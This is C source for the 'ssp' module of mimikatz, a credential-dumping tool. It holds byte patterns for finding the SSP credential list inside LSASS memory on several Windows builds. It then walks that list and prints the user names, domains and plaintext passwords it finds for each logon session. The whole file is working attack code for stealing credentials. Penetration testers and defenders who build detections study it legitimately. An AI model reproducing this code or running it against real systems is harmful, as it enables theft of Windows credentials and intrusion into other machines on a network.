/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_ssp.h"

#if defined(_M_ARM64)
BYTE PTRN_WIN10_SspCredentialList[] = {0x09, 0xfd, 0xdf, 0xc8, 0x60, 0x42, 0x00, 0x91, 0x20, 0x01, 0x3f, 0xd6, 0x69, 0x02, 0x40, 0xf9};
KULL_M_PATCH_GENERIC SspReferences[] = {
	{KULL_M_WIN_BUILD_10_1803,		{sizeof(PTRN_WIN10_SspCredentialList),	PTRN_WIN10_SspCredentialList},	{0, NULL}, {-12, 4}},
};
#elif defined(_M_X64)
BYTE PTRN_WIN5_SspCredentialList[]	= {0xc7, 0x43, 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
BYTE PTRN_WIN6_SspCredentialList[]	= {0xc7, 0x47, 0x24, 0x43, 0x72, 0x64, 0x41, 0x48, 0x89, 0x47, 0x78, 0xff, 0x15};
BYTE PTRN_WIN10_SspCredentialList[]	= {0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
KULL_M_PATCH_GENERIC SspReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_SspCredentialList),	PTRN_WIN5_SspCredentialList},	{0, NULL}, {16}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_SspCredentialList),	PTRN_WIN6_SspCredentialList},	{0, NULL}, {20}},
	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WIN10_SspCredentialList),	PTRN_WIN10_SspCredentialList},	{0, NULL}, {14}},
};
#elif defined(_M_IX86)
BYTE PTRN_WALL_SspCredentialList[]	= {0x1c, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
KULL_M_PATCH_GENERIC SspReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_SspCredentialList),	PTRN_WALL_SspCredentialList},	{0, NULL}, {12}},
};
#endif

PKIWI_SSP_CREDENTIAL_LIST_ENTRY SspCredentialList = NULL;

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_ssp_package = {L"ssp", kuhl_m_sekurlsa_enum_logon_callback_ssp, TRUE, L"msv1_0.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_ssp_single_package[] = {&kuhl_m_sekurlsa_ssp_package};

NTSTATUS kuhl_m_sekurlsa_ssp(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_ssp_single_package, 1);
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsass = {NULL, pData->cLsass->hLsassMem};
	ULONG monNb = 0;

	if(kuhl_m_sekurlsa_ssp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_ssp_package.Module, SspReferences, ARRAYSIZE(SspReferences), (PVOID *) &SspCredentialList, NULL, NULL, NULL))
	{
		aLsass.address = SspCredentialList;
		if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(LIST_ENTRY)))
		{
			aLsass.address = mesCredentials.Flink;
			while(aLsass.address != SspCredentialList)
			{
				if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY)))
				{
					if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId) && (mesCredentials.credentials.UserName.Buffer || mesCredentials.credentials.Domaine.Buffer || mesCredentials.credentials.Password.Buffer))
					{
						kprintf(L"\n\t [%08x]", monNb++);
						kuhl_m_sekurlsa_genericCredsOutput(&mesCredentials.credentials, pData, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
					}
					aLsass.address = mesCredentials.Flink;
				}
				else break;
			}
		}
	} else kprintf(L"KO");
}